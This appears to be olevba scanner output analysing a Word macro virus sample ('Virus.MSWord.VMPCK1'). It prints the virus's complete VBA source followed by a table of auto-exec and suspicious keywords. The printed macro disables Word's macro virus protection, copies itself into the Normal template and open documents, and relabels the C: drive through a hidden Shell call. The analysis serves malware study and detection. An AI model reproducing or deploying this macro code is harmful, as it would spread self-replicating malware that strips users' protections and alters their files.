olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.ef-f7a8989bdca2c8f16f94a9cbe450809834e2787c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.ef-f7a8989bdca2c8f16f94a9cbe450809834e2787c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO frost.bas 
in file: Virus.MSWord.VMPCK1.ef-f7a8989bdca2c8f16f94a9cbe450809834e2787c - OLE stream: 'Macros/VBA/frost'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'virus "x-f" escrito por FROST barranquilla
On Error Resume Next
Dim normalinf As Boolean: Dim documeinf As Boolean: Dim p As Integer
normalinf = False: documeinf = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
Options.VirusProtection = False
ShowVisualBasicEditor = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
u = Mid(Application.Path, 1, 1)
Application.VBE.ActiveVBProject.VBComponents.Item("frost").Export u & ":\frost.386"
SetAttr "c:\frost.386", vbHidden + vbReadOnly + vbSystem
For p = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(p).Name = "frost" Then
        normalinf = True
    Else
        NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents(p)
    End If
Next p
For p = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(p).Name = "frost" Then
        documeinf = True
    Else
        ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents(p)
    End If
Next p
If normalinf = False And documeinf = True Then
    Set doc = NormalTemplate.VBProject
    doc.VBComponents.Import (u & ":\frost.386")
    doc.VBComponents.Item(2).Name = "frost"
    NormalTemplate.Save
End If
If normalinf = True And documeinf = False Then
    ActiveDocument.VBProject.VBComponents.Import u & ":\frost.386"
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
With Dialogs(wdDialogFileSummaryInfo)
  .Comments = "Virus Frost"
  .Execute
End With
ActiveDocument.Footnotes.Add Range:=Selection.Range, Reference:="por Frost"
Shell ("label c: frost"), vbHide + vbMinimizedNoFocus
End Sub

Sub AutoOpen()
Call Document_Open
End Sub

Sub AutoClose()
On Error Resume Next
Call Document_Open
End Sub

Sub AutoExit()
On Error Resume Next
Call Document_Open
End Sub

Sub filesave()
On Error Resume Next
Call Document_Open
End Sub

Sub fileprint()
On Error Resume Next
Call Document_Open
Dialogs(wdDialogFilePrint).Show
End Sub

Sub FileSaveAs()
On Error Resume Next
Call Document_Open
Dialogs(wdDialogFileSaveAs).Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

